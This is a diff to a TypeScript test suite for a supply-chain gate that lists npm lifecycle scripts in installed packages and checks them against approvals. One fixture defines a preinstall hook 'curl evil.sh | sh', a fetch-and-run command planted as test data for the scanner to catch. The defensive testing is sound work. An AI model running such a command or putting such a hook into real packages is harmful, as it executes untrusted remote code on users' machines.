@@ -38,13 +38,13 @@ function addPackage(
 }
 
 describe("install-script gate (spec 14 1h)", () => {
-  it("enumerates lifecycle scripts structurally from the resolved tree", () => {
+  it("enumerates lifecycle scripts structurally from the resolved tree", async () => {
     const wt = worktree();
     addPackage(wt, "clean-pkg", "1.0.0", { test: "vitest" });
     addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
     addPackage(wt, "@scope/hooked", "0.3.0", { preinstall: "curl evil.sh | sh" });
 
-    const found = collectLifecycleScripts(wt);
+    const found = await collectLifecycleScripts(wt);
     expect(found.map((p) => p.name).sort()).toEqual(["@scope/hooked", "native-pkg"]);
     const native = found.find((p) => p.name === "native-pkg")!;
     // The verbatim script body travels to the approving human.
@@ -52,7 +52,7 @@ describe("install-script gate (spec 14 1h)", () => {
     expect(native.version).toBe("2.1.0");
   });
 
-  it("finds nested and monorepo node_modules (CLI flags cannot dodge the scan)", () => {
+  it("finds nested and monorepo node_modules (CLI flags cannot dodge the scan)", async () => {
     const wt = worktree();
     // `npm install --ignore-scripts=false` changes how the install RAN, not
     // what is on disk — the scan reads the resolved tree either way.
@@ -61,15 +61,15 @@ describe("install-script gate (spec 14 1h)", () => {
     addPackage(topDir, "nested", "0.1.0", { postinstall: "./build.sh" });
     addPackage(path.join(wt, "packages", "app"), "deep", "3.0.0", { prepare: "husky" });
 
-    const names = collectLifecycleScripts(wt).map((p) => p.name).sort();
+    const names = (await collectLifecycleScripts(wt)).map((p) => p.name).sort();
     expect(names).toEqual(["deep", "nested", "top"]);
     expect(findNodeModulesRoots(wt).length).toBe(2);
   });
 
-  it("diffs against approvals keyed on name + version + scriptHash", () => {
+  it("diffs against approvals keyed on name + version + scriptHash", async () => {
     const wt = worktree();
     addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
-    const [pkg] = collectLifecycleScripts(wt);
+    const [pkg] = await collectLifecycleScripts(wt);
 
     // Unapproved → fires.
     expect(unapprovedScripts([pkg], [])).toHaveLength(1);
